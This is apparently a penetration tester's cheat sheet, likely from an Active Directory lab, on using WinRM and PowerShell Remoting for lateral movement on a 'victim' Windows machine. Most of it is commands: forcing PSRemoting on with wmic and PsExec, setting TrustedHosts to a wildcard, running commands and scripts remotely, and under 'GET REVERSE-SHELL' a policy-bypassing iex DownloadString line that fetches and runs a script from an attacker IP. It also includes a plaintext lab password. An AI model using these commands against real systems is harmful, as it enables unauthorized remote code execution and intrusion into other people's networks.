WINDOWS REMOTE MANAGEMENT (WinRM) :

WinRM is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so 
you can think of it as an HTTP based API for WMI.

If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote 
PowerShell session on the machine (as if you were using SSH!)

- The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:
        - 5985/tcp (HTTP)
        - 5986/tcp (HTTPS)
If one of these ports is open, WinRM is configured and you can try entering a remote session.



INITIATING WinRM SESSION :

We can configure PowerShell to work with WinRM. According to Microsoft documentation, Enable-PSRemoting is a cmdlet that configures the computer to 
receive PowerShell remote commands. 
If we have access to an elevated PowerShell prompt on the victim, we cam enable it and add any "attackers" as trusted hosts. 

- We can run the following two commands:
        > Enable-PSRemoting -Force  
        > Set-Item wsman:\localhost\client\trustedhosts *

This adds a wildcard to the trustedhosts setting. Be wary of what that entails. 
NOTE: I had to change the network type on my attack machine from "Public" to "Work" network.

- You can also activate WinRM remotely **_using _wmic:
        > wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"



TEST IF CONFIGURED :

Once the attack machine is configured, use the Test-WSMan function to test whether the target is configured for WinRM. You should see some information 
returned about the protocol version and wsmid:
        > Test-WSMan -computername DCORP-STD110
        > Test-WSMan



EXECUTE A COMMAND :

Now we can use PowerShell's Invoke-Command to remotely execute a command on the target over WinRM. To remotely run ipconfig and see the output:
       ?> Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
        >  Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {ipconfig /all}


You can also execute a command of your current PS console via Invoke-Command. Suppose that you have locally a function called enumeration and you want 
to execute it in a remote computer, you can do:
        > Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]



EXECUTE A SCRIPT :

        > Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]



GET REVERSE-SHELL :
        
        > Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}



GET A PS SESSION :

Or, if you want to drop right into an interactive PowerShell session, use the Enter-PSSession function:
        __
       |
                #If you need to use different creds
                > $password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
                ## Note the ".\" in the suername to indicate it's a local user (host domain)
                > $creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

                # Enter
                > Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
                ## Bypass proxy
                > Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
                # Save session in var 
                > $sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
                > Enter-PSSession $sess
                ## Background current PS session
                > Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
                                                                                                                                                      |
                                                                                                                                                     __
        The session will run in a new process (wsmprovhost) inside the "victim"



FORCING WinRM OPEN :

If you really want to use PS Remoting and WinRM but the target isn't configured for it, you could "force" it on through a single command. I wouldn't 
recommend this but if you really wanted to use WinRM or PSRemoting than by all means do it this way. 

For example, using PSExec:
        > PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
        
        Now we can enter a remote PS session on the victim.



SAVING AND RESTORING SESSIONS :

This won't work if the the language is constrained in the remote computer.

        __
       |
                #If you need to use different creds
                > $password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
                ## Note the ".\" in the suername to indicate it's a local user (host domain)
                > $creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

                #You can save a session inside a variable
                > $sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
                #And restore it at any moment doing
                > Enter-PSSession -Session $sess1               
                                                                                                        
                                                                                                                                                |
                                                                                                                                               __
        Inside this sessions you can load PS scripts using Invoke-Command
                > Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1




ERRORS :

If you find the following error:

                enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The 
                WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if 
                the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine
                must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that 
                computers in the TrustedHosts list might not be authenticated. You can get more information about that by running 
                the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.


Then try on the client URL : "https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server"
        
        > winrm quickconfig
        > winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'





























